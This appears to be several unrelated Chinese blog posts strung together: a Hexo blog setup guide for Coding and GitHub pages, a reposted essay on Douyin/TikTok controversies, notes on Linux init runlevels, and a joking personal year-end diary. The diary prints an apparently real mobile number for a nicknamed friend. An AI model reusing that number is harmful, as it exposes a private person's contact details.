http://yourGlobalKey.coding.me
比如说我的Coding的博客wynshtier, 否则的话后面得加上项目名.
配置 SSH 公钥访问 git 仓库
coding 中配置ssh 公钥访问git仓库：（官方文档）
https://coding.net/help/doc/git/ssh-key.html
首先打开命令行终端输入ssh-keygen -t rsa -C your_email@example.com( 你的邮箱)，连续点击 Enter 键即可。
ssh-keygen -t rsa -C "shiter@live.cn" 

Coding 提供账户 SSH 公钥和项目 SSH 公钥设置。本质上账户公钥和部署公钥是一样的，只是关联的方式不同。同一个 SSH 公钥文件，如果和 Coding 账户关联，便称为账户 SSH 公钥，配置后拥有账户下所有项目的读写权限；如果和具体的某一个项目关联，则称为部署公钥，配置后默认拥有该项目的只读权限。
在终端输入open ~/.ssh，用文本编辑器打开「id_rsa.pub」文件（此处是生成公钥的默认名称，如果生成公钥时采用了其他名称，打开相对应的文件即可），复制全部内容，然后粘贴即可。

完成后测试
ssh -T git@git.coding.net 


使用下面命名发布博客的时候，记得修改Hexo博客目录下的站点配置文件 _config.yml 中的部署配置
hexo deploy



github
github 教程网上很多，就不列举了。
在百度搜索，添加网站，由于我拥有域名，所以直接添加解析
https://ziyuan.baidu.com/site/index
码云
由于专业版才支持绑定域名，所以对于有域名的还得交钱，算了。forget it

2. 手动cdn，智能解析
原理其实很简单，主要是针对来访IP 进行设置，国内IP 访问coding，国外的ip 访问github。
当然收费版的域名解析服务提供了此项内容。我们只买个域名没有这个服务。除了域名配置境内境外（好像还可以使用dnspod）



3. 添加评论系统
评论系统对比表， 网上多方搜寻，其实推荐Valine及git 开头的几个。



名称
推荐指数
介绍




来必力
3
国外的，不能匿名评论，支持邮箱账号注册评论，据说容易出现乱码。


DISQUS
2
国外的，界面又丑，加载又慢。


畅言
4
国内的，不能匿名评论，，需要手机号验证。需要你的备案号，不然你网站没法长时间使用畅言。据说灌水厉害，这个功能目前已经是出于失灵与半失灵的状态，官方估计也没怎么维护了。


有言
3
国内的，支持匿名评论（默认关闭，需手动开启），但只是匿名，没有留联系方式的地方。


Facebook Comments
3
国外的，个人网站很少见人用，不做评论。


HyperComments
3
国外的，支持匿名评论，可以评论上传图片、影片等。功能还是比较强大，设置界面是英文，且没有中文支持。收费，只能免费试用14天。界面美观。


Valine
5
国内的，不能匿名评论，但也不需要注册那么麻烦，简单风格。


gitment
4
基于 GitHub Issues 的评论系统。支持在前端直接引入，不需要任何后端代码。可以在页面进行登录、查看、评论、点赞等操作，同时有完整的 Markdown / GFM 和代码高亮支持。尤为适合各种基于 GitHub Pages 的静态博客或项目页面。


gitalk
3
支持Markdown。 基于 GitHub Issues 的评论系统 ，面向程序员，不能匿名评论，需博主初始化话题，用户需登录 github 账号评论。


由于我见最多自建博客评论系统的是Valine，所以我暂定的 Valine 。
添加valine 评论系统
https://valine.js.org/

4. 博客置顶
参考：
https://blog.csdn.net/qwerty200696/article/details/79010629
两点：
1.安装插件hexo-generator-index-pin-top
2.修改/blog/themes/next/layout/_macro 目录下的post.swig文件

5. 页脚统计信息
参考
https://www.jianshu.com/p/1ff2fcbdd155
NexT 6.x.x 直接添加了统计的信息，直接将next主题文件夹中的 _config.yml 中  busuanzi 统计打开 即可。
写上下面的代码也是ok
<!-- 以下代码 https 内容更改 20190618 -->
<!-- 新增访客统计代码 -->
<div class="busuanzi-count">
    <script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="site-uv">
      <i class="fa fa-user"></i>
      访问用户： <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 人
    </span>
    <div class="powered-by"></div>
    <span class="site-uv">
      <i class="fa fa-eye"></i>
      访问次数： <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次
    </span>
    <!-- 博客字数统计 -->
    <span class="site-pv">
      <i class="fa fa-pencil"></i>
      博客全站共： <span class="post-count">{{ totalcount(site) }}</span> 字
    </span>
</div>
<!-- 新增访客统计代码 END-->

5. NexT 6 添加字数和阅读时间统计
https://blog.csdn.net/coder_jeremy/article/details/83588674
Hexo添加字数统计、阅读时长
https://www.jianshu.com/p/6908ac34bbb2
以上可能都失效了，新的是：
https://github.com/theme-next/hexo-symbols-count-time

本人博客效果
以下展示本人博客 部分内容，截图
http://www.wynshiter.cn/
主页

内容及评论系统

优秀博客链接参考
博客的整体风格及网页留言对话系统
https://blog.pangao.vip/








源 / 顶级程序员   文 / 江户川雨抖音导致“文化堕落”作为近两年最受人们关注的手机软件之一，抖音已经成为了很多年轻人的最爱，根据最新的数据显示，抖音在国内的日活达到了2.5亿，成为了当之无愧的新一代国民APP。而在海外市场，抖音的存在感也正在日益加强，在过去的三个月时间里，抖音海外版TikTok的全球下载量增长了20％，其中仅在美国地区就新增了3000万用户，下载量激增25%。但在海外，抖音最近出了点事，很严重，据说导致了“青少年文化堕落”。据美国科技媒体The Verge报道，印度立法者称，TikTok（抖音国际版）将导致该国青少年和年轻人“文化堕落”，呼吁政府对这一应用采取行动。据《经济时报》报道，印度泰米尔纳德邦信息技术部长曼尼坎丹表示，，“社区福利工作者转发给我的问题——在Tiktok）平台上出现了不少有害于法律和秩序的激烈争论，并共享色情内容。”当地政府给出的建议是在泰米尔纳德邦禁用TikTok。抖音海外版叫做TikTok，自进入印度以后表现十分亮眼。从2017年12月到2018年12月的一年时间里，其下载量从130万次增长到3230万次，暴涨近25倍。但是在飞速增长的用户量背后，其软件内的内容一直在当地颇有争论。《新印度快报》的一篇报道称，2018年12月，36名青少年在TikTok上遭遇网络欺凌。此前的一起案件显示，有一人在TikTok上发布视频后遭遇欺凌，随后他选择了卧轨自杀。除了印度之外，TikTok在印度尼西亚也曾因为一段女孩在家人过世的时候录的抖音视频，背景音乐为《see you again》，在视频的最后切入了家人与逝者告别的画面。这引发民众不满，一度有约12.5万网友通过签名请愿，要求封禁该App。而在日本这个国家，怎么说呢....抖音变成了“A片”来源。许多人在其他平台上传的性片段，来源就是Tik Tok。对此，抖音的一名发言人表示，该公司正在招聘一名驻印度的首席节点官（chief nodal officer），以“更好地与执法机构谐和”。“我们采取了包括报告机制在内的一系列强有力措施来维护用户不被误导，用户和执法部门也可以向我们报告违背抖音运用条款和社区指导方针的内容，”该发言人补充说。争议抖音与2014年相比，2016年的无线网速和带宽更加不是问题。同年迎来了比较大的一拨4g手机换机潮，而此时，由游戏培养起来的付费用户增加。短视频流行有了更大的硬件和用户基础。此时，短视频突然火爆起来，因为短小的特性迎合了移动网络时代受众阅读碎片化的习惯。有了这样的市场条件，抖音应运而生。即使没有他，也会有其他短视频软件火爆。而抖音火爆起来之后一直都是充满争议的。因为短视频内容制作门槛低，平台根据流量推送热门，就会产生低俗色情等视频来吸引流量。短视频应用中的视频大都是十几秒，而应用系统会根据你感兴趣的短视频，以信息流的形式成百上千地推到你的面前。每次短短几十秒不停地刷，每一个都是感兴趣的，缺乏自制力的人，一刷几个小时是常事。而这样的“快文化”往往让人在观看时感觉很舒心，但是几个小时观看过后又会觉得空虚、无聊、什么都没有得到，感觉浪费了不少时间。要知道，当孩子的大脑长期被这种“高刺激阈值”包围，习惯了轻而易举能获得大量愉悦感，他们就会慢慢对这种愉悦感脱敏。久而久之，这种强度的愉悦感已经满足不了，他们还会需要更高强度、更持续、更深入的刺激。相对而言，愉悦感更少、付出更高的行为——比如学习、阅读、思考，自然也就没有人愿意去做。还有就是短视频应用捧红了不少的网红，而有些网红往往会带来不好的价值观。有不少的95、00后就表示以后的志向是当一名网红可以说部分不良网红的出现在一定程度上扭曲了现代年轻人的三观和价值选择，这一点也是抖音被争议很重要的原因。之前一直被诟病的就是抖音上有很多不良信息的出现，有些人为了博眼球故意拍摄低俗、不健康的，宣导错误价值观的视频。之前在抖音视频里还经常看到有人骂脏话，家长根本防不胜防！这些脏话常常就不经意间从孩子嘴里冒出来，连他们自己都不知道啥意思。还有抖音上炫富的视频比比皆是，最常见的是晒豪宅、晒豪车、晒豪华旅行。这类炫富视频对孩子的价值观养成很不利。抖音上随便一刷，就刷到一个四五年级模样的小学生在炫耀一只妈妈给她在韩国带回来的包包……在抖音上，关于宠物的视频很多，曾经有些人为了点赞多，不惜发布一些虐待动物的视频，获得更多的关注。曾经看到一个拖着猫擦地的视频，完全不顾猫的感受，这个视频播放量高的吓人。在抖音上，经常会出现自虐或者玩苦情的视频，比如而在国内，抖音上也曾出现过女童哭诉"我妈被车撞死求赞"视频 ，被不少网友质疑该视频内容违反人伦。之前还有一些恶搞的视频，整老公、整孩子、整老人……还有在电梯门上粘胶带的，如果有孩子有样学样，而有老人出来，后果不堪设想。还记得之前流传的一系列的“小哥哥你网恋吗？我萝莉音”的视频吗？还有一些年轻老师热衷于把自己学生的视频上传到抖音，比如，不会做简单的数学题、上课打瞌睡、课间出洋相等，更厉害的还会导演搞笑低级的段子……抖音被质疑的最大一个原因是平台上有大量的未成年人，这些人生观、价值观还没成熟的青少年尤其是低幼年龄的孩子无识别能力，他们就像一块海绵，包容地吸收着外界传输给他们的内容，甚至还无法辨别什么是好坏。长期下来，这些以娱乐为目的低俗话题内容，势必会影响他们的成长走向。总之，有人利用短视频应用红利年入千万，有人则指责抖音短视频的快文化让越来越多的人沉迷网络，而大多数的人指责平台上内容低俗令人堕落。娱乐至死尼尔·波兹曼在《娱乐至死》里这样写过这样的一段话：“一切公众话语日渐以娱乐的方式出现，并成为一种文化精神。我们的政治、宗教、新闻、体育、教育和商业都心甘情愿地成为娱乐的附庸，毫无怨言，甚至无声无息，其结果是我们成了一个娱乐至死的物种。”现在越来越多的人患上了网络依存症，对各类娱乐新闻上瘾、产生依赖，人云亦云，附和跟风，沉溺在虚拟的世界中不能自拔。我害怕长久以往，自己会变成一个透明的躯壳，脑袋空空、沉浸于感官娱乐。我们正在爱上这些使我们丧失思考能力的工业技术。抖音、快手、抖音、微博这些软件正在飞速地强化我们对新奇事物的需求度，并拉高我们的敏感度。同时降低的就是对文字的需求度与耐心度。而刷多了抖音、快手、微博这些软件之后，我们就会形成一种惯性：没有耐心去读一本长文或者书籍。更没有时间去思考，因为我们总是在期待着下一个引爆眼球的新奇事物，等待着它在视频中直接了当的呈现。有人说，你的时间花在哪，你就会成为什么样的人。格局高的人，不会花太多时间在娱乐上。这里有一份报告，有这样一段叙述：“收入越低的居民看电视的时间越多，低收入群体每天看电视的时间为1小时50分钟；收入越高的居民阅读书报期刊的时间越多，高收入群体阅读时长为20分钟。高收入群体中21%有阅读行为，而低收入群体中只有6.6%的人才有阅读行为。”简单来说，越穷的人，越喜欢躺着无所事事看电视，刷抖音，看直播；越富有的人，越喜欢接纳文字信息。哈佛大学社会学教授马修戴斯蒙曾卧底贫民窟，了解贫穷最根本的原因。他发现，导致极端贫困并延续给子嗣后代最根本的原因，其实是一种观念：越穷的人，越喜欢被动灌输，大脑处于空白状态，被外界的信息所控制；与之相反，那些稍微富有的人，往往具备一定的主动性与思考能力，他们愿意思索正确与否，愿意反思自己。，同时纠正错误行为。一天24小时，每个人都一样，上帝很公平，把24小时分成三块，工作8小时，睡眠8小时，休闲8小时。（哎？好像程序员有些例外……）睡觉时，我们意识不到自己在做什么，也意识不到时间在流逝；休闲时，很多人一样意识不到自己在做什么，刷刷抖音，看看电视，也就过去了；工作时，他们甚至依然意识不到自己在做什么。于是，一天，就这么浑浑噩噩地过去了；于是，一辈子，也就这么浑浑噩噩地过去了。康德说：“未经思考的人生不值得过。”那么，浑浑噩噩，无论以何种方式浑浑噩噩，都是人生最大的失败。尤其是在这个娱乐至死的年代。技术无罪还记得由印度国宝演员阿米尔汗主演的电影《神秘巨星》吧，影片中女主角正是依靠着发自己唱歌的视频在网络走红，从而脱离暴力父亲的掌控改变了人生。对于视频传播平台本身来讲并无对错。我们更不能忽略其积极的一面。还记得快播的王欣吧。但技术是无罪的。不可否认，有部分的确没有自制力的依然沉迷其中，无法自拔，但娱乐无罪，技术无罪，网上叫嚣着封杀抖音的声音那简直就是倒洗澡水连孩子一起甩出去了。这个最让人警惕。王小波曾经说过：“有些人认为，人应该充满境界高尚的思想，去掉格调低下的思想。这种想法听上去很美妙，却使我感到莫大的恐慌，因为高尚和低俗的总和，就是我们自己，倘若去掉一部分，我是谁就成了问题。”可能抖音真的有一部分人，是真的乱七八糟，低俗之极。但你不得不承认的也是，任何东西都有他的两面，抖音也不例外，它是一个多元化的平台，它既盖涵了杂七杂八的三观不正的网红，也有一群积极向上，热爱生活的人。过年的时候，姑父漏了一小手做了一道菜，对于一个从不下厨的人我很好奇他是怎么做到的。他自豪的告诉我说是从抖音上学到的。 对待短视频应用首先要肯定它积极的一面！而且还有很重要一点，在短视频平台看到的东西，绝大部分取决于你的爱好，你喜欢什么，系统就给你推送什么。你喜欢“低俗”视频，系统就给你推送“低俗”视频，你喜欢正能量视频，系统就给你推送正能量视频，你看到的东西大部分取决于你的爱好。所以，说看到的内容无聊的人可以反思一下，为什么自己看到的东西都是无聊的垃圾？是不是因为你自己本身就特别喜欢垃圾内容。适当的放松和娱乐是好的，抖音也是一个合适的平台，其间也有很多积极向上的内容，但不可否认，仍旧有很大一部分受追捧的内容是低级而庸俗的趣味。2018年4月份，国家终于对网络环境进行了一次大的整治行动，快手短视频就被勒令整改。整改过后的抖音快手等已经很少发现低俗内容了。其实我们真正要讨论的是，作为一个公众平台，在拥有稳定的受众群体后，就应当在内容监管上把好关口，尤其是制定好规则，少一点以盈利为目的的娱乐化，多一点正能量的传播。其实更多的人已经明白了这个道理，在这个快速更迭的时代，我们应该时刻警惕的是娱乐至死，明白技术无罪，督促那些既得利益者们担负起应有的责任。-END-原创声明：本文为「顶级程序员」原创文章，转载请联系后台。素材来源于网络。







启动级别:init 0,1,2,3,4,5,6
2010-10-29 15:47:50|  分类：linux之路阅读376
评论0  字号：大中小 订阅

这是个很久的知识点了，只是自己一直都迷迷糊糊的，今天在翻出来好好理解下。。
0:停机
1：单用户形式，只root进行维护
2：多用户，不能使用net file system
3：完全多用户
5：图形化
4：安全模式
6：重启 

其实，可以通过查看/etc/rc.d/中的rc*.d的文件来对比理解。。
init 0，对应的系统会运行，/etc/rc.d/rc0.d里指定的程序。我们来看下名称。
[root@localhost  ～]# ls /etc/rc.d/rc0.d 
K01dnsmasq    K15ksmtuned  K35nmb         K60crond       K74lm_sensors  K83portreserve     K85rpcgssd    K88iscsi
     K90network       S00killall
K10cups       K16ksm       K35smb         K66gpsd        K75netfs       K84NetworkManager
  K85rpcidmapd  K88rsyslog   K92ip6tables 
    S01halt
K10saslauthd  K20nfs       K36mysqld      K69rpcsvcgssd  K75udev-post   K84wpa_supplicant  K86nfslock    K89iscsid
    K92iptables
K10xfs        K25sshd      K50haldaemon   K70vboxdrv     K76openvpn     K85mdmonitor       K87alsasound
  K89netplugd  K98qemu
K15gpm        K30sendmail  K50netconsole  K74acpid       K83bluetooth   K85messagebus      K87rpcbind    K89rdisc
     K99lvm2-monitor
依照上述红色字体，开机会执行的两个进程是killall和halt，这两个都表示为终止进程。故init 0是用于表示关机的。

init 1，对应的系统会运行，/etc/rc.d/rc1.d里指定的程序。
[root@localhost ～] # ls /etc/rc.d/rc1.d
K01dnsmasq    K15ksmtuned  K35nmb         K60crond       K74lm_sensors   K84NetworkManager  K85rpcidmapd  K88rsyslog
   K92ip6tables    S99single
K10cups       K16ksm       K35smb         K66gpsd        K75netfs        K84wpa_supplicant
  K86nfslock    K89iscsid    K92iptables
K10saslauthd  K20nfs       K36mysqld      K69rpcsvcgssd  K76openvpn      K85mdmonitor       K87alsasound
  K89netplugd  K98qemu
K10xfs        K25sshd      K50haldaemon   K70vboxdrv     K83bluetooth    K85messagebus      K87rpcbind
    K89rdisc    S02lvm2-monitor
K15gpm        K30sendmail  K50netconsole  K74acpid       K83portreserve  K85rpcgssd         K88iscsi  
    K90network  S26udev-post
这个级别启动的服务有三个，udev、lvm相关的和single(单用户模式的服务)。故此级别是单用户模式，只有root能用，不支持其他用户。

init 2，对应的系统会运行，/etc/rc.d/rc2.d里指定的程序。
[root@localhost ~ ]# ls /etc/rc.d/rc2.d/
K01dnsmasq    K20nfs       K36mysqld      K74lm_sensors      K85rpcgssd    K89netplugd     S08iptables
    S23NetworkManager  S30vboxdrv    S99local
K10saslauthd  K25sshd      K50haldaemon   K75netfs           K85rpcidmapd  K89rdisc       
 S12rsyslog     S24portreserve     S35qemu
K10xfs        K30sendmail  K50netconsole  K76openvpn         K86nfslock    K90network      S13rpcbind
     S25cups            S85gpm
K15ksmtuned   K35nmb       K66gpsd        K83bluetooth       K88iscsi      S02lvm2-monitor
  S15mdmonitor   S26acpid           S90crond
K16ksm        K35smb       K69rpcsvcgssd  K84wpa_supplicant  K89iscsid    S08ip6tables  
   S22messagebus  S26udev-post       S99alsasound
这个级别启动的服务多了，NetworkManager/iptables/acpid/alsa都已经开启，但是nfs,smb,openvpn相关服务没有开启，这个级别不支持nfs。

init 3 ， 对应的系统运行/etc/rc.d/rc3.d
[root@localhost ~] # ls /etc/rc.d/rc3.d/
K01dnsmasq    K30sendmail    K74lm_sensors      K89rdisc        S08iptables  S18rpcidmapd
       S25cups       S35qemu       S85ksmtuned   S99local
K10saslauthd  K36mysqld      K76openvpn         K90network      S12rsyslog   S19rpcgssd
         S25netfs      S50bluetooth  S90crond
K10xfs        K50netconsole  K84wpa_supplicant  K99lvm2-monitor  S13iscsi     S22messagebus    
  S26acpid      S50haldaemon  S91nmb
K20nfs        K66gpsd        K85mdmonitor      S07iscsid        S13rpcbind
   S23NetworkManager  S26udev-post  S84ksm        S91smb
K25sshd       K69rpcsvcgssd  K89netplugd       S08ip6tables     S14nfslock   S24portreserve
     S30vboxdrv    S85gpm        S99alsasound
这个级别nfs服务是开启的，被成为完全多用户模式。

init 4
[root@localhost ~ ]# ls /etc/rc.d/rc4.d/
K01dnsmasq    K30sendmail    K66gpsd            K85mdmonitor    S07iscsid    
 S13rpcbind     S23NetworkManager  S26udev-post  S84ksm        S99local
K10saslauthd  K35nmb         K69rpcsvcgssd      K89netplugd     S08ip6tables  S14nfslock
     S24portreserve     S30vboxdrv    S85gpm
K10xfs        K35smb         K74lm_sensors      K89rdisc        S08iptables
   S18rpcidmapd   S25cups            S35qemu       S85ksmtuned
K20nfs        K36mysqld      K76openvpn         K90network      S12rsyslog  
  S19rpcgssd     S25netfs           S50bluetooth  S90crond
K25sshd       K50netconsole  K84wpa_supplicant  K99lvm2-monitor  S13iscsi      S22messagebus  S26acpid
           S50haldaemon  S99alsasound
 此模式被称为安全模式。

init 5
[root@localhost ~ ]# ls /etc/rc.d/rc5.d/

K01dnsmasq    K25sshd        K66gpsd         K84wpa_supplicant  K87rpcbind   K90network      S22messagebus
      S26udev-post  S84ksm        S99local
K10saslauthd  K30sendmail    K69rpcsvcgssd   K85mdmonitor       K88iscsi     K99lvm2-monitor  S23NetworkManager
  S30vboxdrv    S85ksmtuned
K10xfs        K36mysqld      K74lm_sensors   K85rpcgssd         K89iscsid    S08ip6tables
     S25cups            S35qemu       S91nmb
K15gpm        K50netconsole  K76openvpn      K85rpcidmapd       K89netplugd  S08iptables
      S25netfs           S50bluetooth  S91smb
K20nfs        K60crond       K83portreserve  K86nfslock         K89rdisc    S12rsyslog
       S26acpid           S50haldaemon  S99alsasound

完整的图形模式

init 6
[root@localhost ~ ]# ls /etc/rc.d/rc6.d/
K01dnsmasq    K15ksmtuned  K35nmb         K60crond       K74lm_sensors  K83portreserve     K85rpcgssd    K88iscsi
     K90network      S00killall
K10cups       K16ksm       K35smb         K66gpsd        K75netfs       K84NetworkManager
  K85rpcidmapd  K88rsyslog   K92ip6tables    
S01reboot
K10saslauthd  K20nfs       K36mysqld      K69rpcsvcgssd  K75udev-post   K84wpa_supplicant  K86nfslock    K89iscsid
    K92iptables
K10xfs        K25sshd      K50haldaemon   K70vboxdrv     K76openvpn     K85mdmonitor       K87alsasound
  K89netplugd  K98qemu
K15gpm        K30sendmail  K50netconsole  K74acpid       K83bluetooth   K85messagebus      K87rpcbind    K89rdisc
     K99lvm2-monitor
这个级别里，只有两个服务，一个为killall，一个是reboot，即，关闭现在的系统，重启。故此级别是重启。

不同的系统版本，可能里面的文件会不同，如果要查看，可以通过ll来看，其实他们都是软连接。










很早以前的日志大概写于2014年中，挺好玩的，贴上来供大家欣赏 

我还是很中意思维跃然纸上的感觉。说好的一个月一篇日志，还没有实现，就感觉时光匆匆。
Wu Jiafen women’s College– Guo Du campus –shool of computer , year summary
I’m fond of the feeling for putting my thought stand vividly revealed on the paper.I used to promised writing a blog for once a month,but I didn’t make it.Time flies~~~
1.前菜 
Terrine of fish and prawns watercress sauce – 鱼虾冻配绿豆瓣酱(前菜)
去年九月至今，研一就要结束。整个学年，基本都在适应，无论是走进课堂还是看书的状态，学习也是一样用进废退的技能，如果没有什么好习惯，不多时候，大脑就会退化成一个肉球。在这个时代，始终要成为一名终生的学习者，每天吸取新的知识免得被社会淘汰。
Since last septemper, the first year of my graduated school is coming to an end. Thouthout the year, I’m always trying to adopt everything around, not only for 
being participate in  having classes again, but also for the state of reading the book and Generalized learning. Learning is also a skill which will degradation when you discarded it for long time. Without good habit, your brain will become a meatball sooner or later. In this era, one must be a life-long learner, absorb new technology and knowledge everyday, in order not to eliminted by the society.
来这里的一年，有很多有趣的事情，加上情节其实可以写一部小说。 
很多人觉的，女子专修学院是男人的天堂，其实女人跟女人一起待久了就会变的胸悍，一票男神（井冰）在这里也没有什么安全感，选择太多就无从下手，世间的事大抵如此。
上学以前，王大力听说过一个故事，传说有个学校的老师一天晚上在实验室，发现网速特别卡，就发现一个学生不好好写代码，下载电影看，盛怒之下抄起键盘一顿暴揍，都揍进了医院，后来学校高层听闻，以老师破坏实验室财物为名，罚了老师200块钱。有句话说的好，只有当蚊子落在你蛋蛋上的时候，你才会明白，暴力不是解决问题的最好方式。这个故事还告诉我们，下电影不能被老师发现，不然助研津贴还会少200。。。
后来刚到学校的时候，王大力想起以前的故事见到老师总是战战兢兢的。直到老刘一句:慌什么，大家一起混嘛。瞬间消除了这层隔阂。
春风沉醉的午夜，飞哥跟着一群计科院学狗出了实验室，他一首推着自行车，一手插在口袋里，学狗们此时不约而同的聊起了电话，于是寂寞是他们的，飞哥什么也没有，我于是问飞哥，你该找个女朋友了，他幽幽然谈了口气，仿佛记起了什么遥不可及的事情，然后缓缓的说道：哎，都过去了，累觉不爱了。忘着飞哥远去的背影，我忽然觉得，如果连篮球场卖水的老大爷都知道，我喜欢青柠口味的脉动，那么在这个世界上，想要了解一个人还有什么困难。
2.几个人
Consomme Celestine – 法式教皇清汤(汤)
雷总说他在原来的公司呆久了，想要去北上广闯一闯，所以有一次，叫我跟湿胸出来吃饭。中途掏出来一根Pregnancy Test Kit说是晚上叫学妹Test一下，他还说只有经历过这种事情男人才能真正的成长起来，我跟湿胸对于雷总的教导总是深信不疑。那顿饭我们吃的很饱，分别的时候，雷哥突然把他的公家卡塞给了我，他说他再也用不上了，我知道不久以后，他也要离开了，世间的事大抵如此，这样的故事每年都发生在这城市之中，后来可能因为两道杠的检测结果耽搁了雷总的计划，他还留在这座城里，并且时不时的告诉我们，有女朋友的都抱紧了啊，老衲要开始摇微信了！

雷总简介：

android高程，精通java，jsp和所有j打头的语言，经验丰富，能够独立完成app从概要设计到后期调试维护的所有工作，上至带项目、出方案，下至盗账号、睡PM啥都能干，代码风骚，效率恐怖！ 
  国立西安大学金牌摇妹子专家！著有《android大全》《放荡不羁的那些年》《我的32块腹肌》《21天精通摇妹子》《不要在意那些细节》另有三本出版图书根据相关政策与法规未能予以显示。


很多年了湿胸这个技术宅还是比较喜欢吃窝边草，这是一个好习惯。经常可以从他这里了解到一些前沿的东西。还有几天几夜不睡垒程序的能力总是叫人印象深刻。码程序的人都喜欢抽烟，湿胸也不例外，他跟雷总抽烟就好像跟销魂的女人滚床单一般叫人看着都欲罢不能，我也试着滚过几次，可是这个女人感觉一般，我也没有再留恋她。

湿胸简介：

高程，各种牛。C/C++、Java、Php无不精通，熟练掌握各种框架。可连续编程100小时不休息，讨论技术方案5小时不喝水。技术宅，接私活，专业维修核潜艇，回收二手航母、二手航天飞机，大修核反应堆，拆洗导弹发动机更换机油，无人侦察机手动挡改自动，航天飞机保养换三滤。量大从优，团购7折，秒杀5折，根据国家三包规定7天包退、15天包换、一年保修，有正规发票！ 信誉第一 
  我们口号是：有困难？找湿胸！

项目经历：

联合国保密项目：国际空间站电池板清洗，国家973项目：长城全线瓷砖镶嵌。 
  著有《model-checking》《量子计算机导论》《网络安全系统白皮书》《程序员的自我修养系列之如何变得更加猥琐》《楠哥教你把学长！》《楠哥教你把学弟！》《我和学姐同居的日子》


跟龙哥混了这么多年，真心觉的龙哥厉害，心灵鸡汤不说，什么出淤泥而不染，濯清涟而不妖，这货根本就没进过淤泥就更别提湿鞋了。 比如在找妹子这个问题上龙哥就经常批评我只注重身材低级趣味。龙哥是个超人，你听说过凌晨四点的肯德基么，没有！龙哥凌晨两点睡觉，三点起床在西安外三环骑自行车180迈彪一圈，完后去肯德基喝一杯雪顶咖啡，五点到文理开始热身，六点跟我们开始打球一直到中午，下午跟我们去游泳，我们都游到腿抽筋了，他还在泳池里乐此不疲的喝水。（有次我拉龙哥去另一个泳池游泳，龙哥摇摇头，告诉我说，这里的水不好喝。。。）后来晚上龙哥非拉我们去ktv，大家都没劲了，他手持麦克风对天嘶吼着：我真的还想再活五百年~~~第二天凌晨四点的肯德基，龙哥依旧出现在靠窗边的位置喝雪顶咖啡，望着窗外若有所思。周末总是过的很快，疯狂过去，生活归于平淡。

征婚：

艺名：龙哥，男，NEC基层架构湿，软件工程专家，身体强壮、健步如飞。 
  热爱公益，日行一善。酷爱学霸型女生。经济适用型居家好男人

著有正能量系列图书：

《我在NEC干死小日本》 《如何每天都像打了鸡血一样充满正能量》《心灵鸡汤365天（已经在微信上连载了很久，深受各位朋友喜爱，每天至少收获一个赞！）》《凌晨四点的肯德基》 
  电话：+8613619291478 
  非诚勿扰！


帝都还混迹了几个人，距离远了也不知道是否安好，多子宅估计祥龙也宅，听说宁哥也在还一天一条说说发的不亦乐乎，这样挺好，至少我知道你们still alive。突然在这临近毕业的日子里想起宁哥还有一条警句，静静的躺在261下铺的墙上，青年对明天的失望是对青春的背叛—-卡夫卡，它还在那里继续诉说着睡在我下铺兄弟的过往。 
还有一些哥们，经常毫无征兆的在空间里莫名其妙的诈诈尸。。。生活总是充满惊喜，世间的事大抵如此。
3.爱好
Chocolate Mousse and Hazelnut Cremeux Crispy Hazelnut - 巧克力慕斯、脆榛子配榛子酱(甜点)
每年此时，白昼长到令人惊艳，正是运动的好时节，不知道是不是因为天气的关系，日子简单的成了一个个的关键词，这个时候心中总不时的浮现迷惑与烦闷，我会重温一遍灌篮高手，重新找回生活的节奏。时至今日，我已经离不开体育运动了，这样说好像我俨然成了运动健将。其实总的来说都是重在参与，体育运动尤其是竞技体育的魅力，就在于其对情感的排泄作用，篮球更甚，这其中当然糅合了个人的生活体验，包括初中欣赏的女生一直叨叨踢足球的永远没有打篮球的帅，这样潜移默化的心里暗示。刚开始看《灌篮》的时候，可能每个人都是樱木，每个人心里都有个晴子。后来真正喜欢篮球，不为耍帅，不为发泄，对于篮球的喜欢与理解也幻化成了对生活的喜欢，人生都因此而不同了。
三井寿说，无论多少次，篮球入框的声音都能让他马上复活，如果这时候还能有一丝微风吹过，那就完美了。有个妹子说过专心工作的男生最帅，所以从那以后我干什么都很专注，打篮球的时候更是如此，虽然有些爱好看起来恨渺小，却能让我们站在高处，充满骄傲，心无旁骛的看着自己喜爱的风景，没有一丝惶恐与不安。
贴一段台词，以表示我也是电影人，因为我投资了娱乐宝，我看好《魁拔3》。
you’ve never been out of Boston 
So if I ask you about art you’d probably give me the skinny on every art book ever written. 
Michelangelo?You know a lot about him. 
Life’s work political aspirations.Him and the pope .Sexual orientation.The whole works right? 
I bet you can’t tell me what it smells like in the Sistine Chapel.You never actually stood there and looked up at that beautiful ceiling. 
seeing that. 
If I ask you about women.
you’ll probably give me a syllabus of your personnal favorites.You may have even been laid a few times. 
But you can’t tell me what it feels like to wake up next to a woman and feel truly happy. 
You’re a tough kid. 
I ask you about war you’d probably throw Shakespeare at me right ? 
“Once more into the breach dear friends.” 
But you’ve never been near one.You’ve never held your best friend’s head in your lap and watch him gasp his last breath looking to you for help.  
If I asked you about love you’d probably quote me a sonnet. 
But you’ve never looked at a woman and been totally vulnerable.Known someone that could level you with her eyes. 
Feeling like God put an angel on Earth just for you.Who could rescue you from the depths of hell.
And you wouldn’t know what it’s like to be her angel.To have that love for her be there forever. 
Through anything.Through cancer. 
And you wouldn’t know about sleeping sitting up in a hospital room for two months holding her hand. 
Because the doctors could see in your eyes that the terms “visiting hours” don’t apply to you. 
You don’t know about real loss ,cause that only occurs when you love something more than you love yourself. 
I doubt you’ve ever dared to love anybody that much. 
I look at you.I don’t see an intelligent confident man. 
I see a cocky scared shitless kid.
2009年10月1日00点33分50秒，我发布了一条说说：

有时候不想再逃避了，终究会揉揉疲惫的双眼放开鼠标关上电脑，凝望着夜幕中似有似无的云彩，感受着被霓虹灯折射的孤单，飘荡在这寂寞的城市。 
  爱好这东西，也许可以用来解决这个问题。

大家都这么忙，自己要照顾好自己， 
社会这么参次多态，自己要知道该做点什么， 
世界这么喧嚣，自己要保持住内心的平静， 
我们， 
还有篮球！ 
 
 

4.感情生活
<html>
    <head>
        <title>感情生活</title>
        <meta charset="utf-8"/>
    </head>
<body>
    <script>
        alert('当前访问用户过多，请稍后重试。');
    </script>
</body>
</html>

5.理想
Argentinian Tournedos with Morel Mushrooms Madeira Sauce - 阿根廷腓里牛排与羊肚菌蘑菇配马德拉酱(主菜)
